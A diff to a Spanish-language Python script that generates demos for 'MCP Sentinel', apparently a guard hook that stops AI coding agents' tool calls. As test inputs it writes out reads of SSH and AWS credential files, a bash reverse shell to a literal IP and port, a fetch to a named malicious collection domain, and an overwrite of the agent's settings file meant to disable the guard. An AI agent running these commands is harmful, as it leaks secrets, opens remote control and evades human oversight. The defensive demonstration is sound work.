@@ -37,40 +37,40 @@ def block(user, tool, args, decision, msg, note):
         b += ["_(sin salida = permitido en silencio, sin fricción)_", ""]
     else:
         b += ["🛡️ **MCP Sentinel** intercepta:", "", "```", msg, "```", ""]
-    b += [f"**Resultado:** `{decision}` — {note}", ""]
+    b += [f"**Resultado:** `{decision}`: {note}", ""]
     return "\n".join(b)
 
 demos = []
 
 # 1 benign
 d, m = run_pre({"tool_name": "Read", "tool_input": {"file_path": "/Users/me/proyecto/package.json"}, "session_id": "demo"})
-demos.append(("01-trabajo-normal-sin-friccion.md", "Demo 1 — Trabajo normal (Sentinel no molesta)",
+demos.append(("01-trabajo-normal-sin-friccion.md", "Demo 1: Trabajo normal (Sentinel no molesta)",
     block("Lee el package.json del proyecto.", "Read", "package.json", d, m,
           "Acción legítima: Sentinel no dice nada y la deja pasar. Cero fricción en el día a día.")))
 
 # 2 sensitive path -> ask
 d, m = run_pre({"tool_name": "Bash", "tool_input": {"command": "cat ~/.ssh/id_rsa"}, "session_id": "demo"})
-demos.append(("02-skill-lee-clave-ssh.md", "Demo 2 — Una skill intenta leer tu clave SSH",
+demos.append(("02-skill-lee-clave-ssh.md", "Demo 2: Una skill intenta leer tu clave SSH",
     block("Instalo una skill de 'formateo' y le pido que ordene mi carpeta.", "Bash", "cat ~/.ssh/id_rsa", d, m,
           "Sentinel NO bloquea en seco: te pregunta. Tú decides. Si es tu clave y confías, apruebas una vez y deja de preguntar.")))
 
 # 3 reverse shell -> ask (dangerous_command)
 d, m = run_pre({"tool_name": "Bash", "tool_input": {"command": "bash -i >& /dev/tcp/185.100.87.202/4444 0>&1"}, "session_id": "demo"})
-demos.append(("03-reverse-shell.md", "Demo 3 — Reverse shell (control remoto del equipo)",
+demos.append(("03-reverse-shell.md", "Demo 3: Reverse shell (control remoto del equipo)",
     block("La skill dice que va a 'comprobar la conexión de red'.", "Bash",
           "bash -i >& /dev/tcp/185.100.87.202/4444", d, m,
           "Una reverse shell abre tu equipo al atacante. Patrón de RCE inconfundible: Sentinel lo marca antes de ejecutarlo.")))
 
 # 4 confirmed malicious -> deny
 d, m = run_pre({"tool_name": "WebFetch", "tool_input": {"url": "https://phan@giftshop.club/collect"}, "session_id": "demo"})
-demos.append(("04-dominio-malicioso-confirmado.md", "Demo 4 — Dominio malicioso confirmado (bloqueo duro)",
+demos.append(("04-dominio-malicioso-confirmado.md", "Demo 4: Dominio malicioso confirmado (bloqueo duro)",
     block("La skill del correo (caso real: backdoor de Postmark) manda datos a su servidor.", "WebFetch",
           "https://...giftshop.club/collect", d, m,
           "Infraestructura confirmada de un incidente real: bloqueo DURO, no anulable. Aquí Sentinel no pregunta, corta.")))
 
 # 5 self-disable -> ask (config_tamper)
 d, m = run_pre({"tool_name": "Bash", "tool_input": {"command": "echo '{}' > ~/.claude/settings.json"}, "session_id": "demo"})
-demos.append(("05-intento-desactivar-sentinel.md", "Demo 5 — Intento de desactivar al propio Sentinel",
+demos.append(("05-intento-desactivar-sentinel.md", "Demo 5: Intento de desactivar al propio Sentinel",
     block("La skill maliciosa intenta reescribir tu configuración para quitarse la vigilancia.", "Bash",
           "echo '{}' > ~/.claude/settings.json", d, m,
           "Manipular la config del agente puede desactivar la protección. Sentinel lo detecta (con SENTINEL_INTEGRITY_ENFORCE=on lo bloquea en duro).")))
@@ -80,7 +80,7 @@ tmpstate = tempfile.mkdtemp(prefix="demo-shadow-")
 d, m = run_pre({"tool_name": "Bash", "tool_input": {"command": "cat ~/.aws/credentials"}, "session_id": "demo"},
                env_extra={"SENTINEL_SHADOW": "on", "SENTINEL_STATE_DIR": tmpstate,
                           "SENTINEL_STATS_PATH": str(Path(tmpstate) / "s.json")})
-demos.append(("06-modo-sombra.md", "Demo 6 — Modo sombra (no bloquea, solo cuenta)",
+demos.append(("06-modo-sombra.md", "Demo 6: Modo sombra (no bloquea, solo cuenta)",
     block("Trabajo nocturno automático; no quiero que nada me pare.", "Bash", "cat ~/.aws/credentials", d, m,
           "Con SENTINEL_SHADOW=on, Sentinel evalúa pero NUNCA bloquea: deja pasar y anota 'te habría parado N veces'. Ideal para medir antes de activar la defensa dura.")))
 
@@ -97,7 +97,7 @@ skdir = Path(tempfile.mkdtemp(prefix="demo-evilskill-"))
 r = subprocess.run(["python3", str(SCAN), "--scan-path", str(skdir)], capture_output=True, timeout=15)
 scanout = r.stdout.decode().strip().replace(str(skdir), "./super-formatter")
 (OUT / "07-vetear-antes-de-instalar.md").write_text(
-    "# Demo 7 — Vetear una skill ANTES de instalarla\n\n"
+    "# Demo 7: Vetear una skill ANTES de instalarla\n\n"
     "**Usuario:** Voy a instalar esta skill que encontré. ¿Es segura?\n\n"
     "Antes de confiar, la escaneas:\n\n```\n$ python3 tools/config_scan.py --scan-path ./super-formatter\n"
     f"{scanout}\n```\n\n"
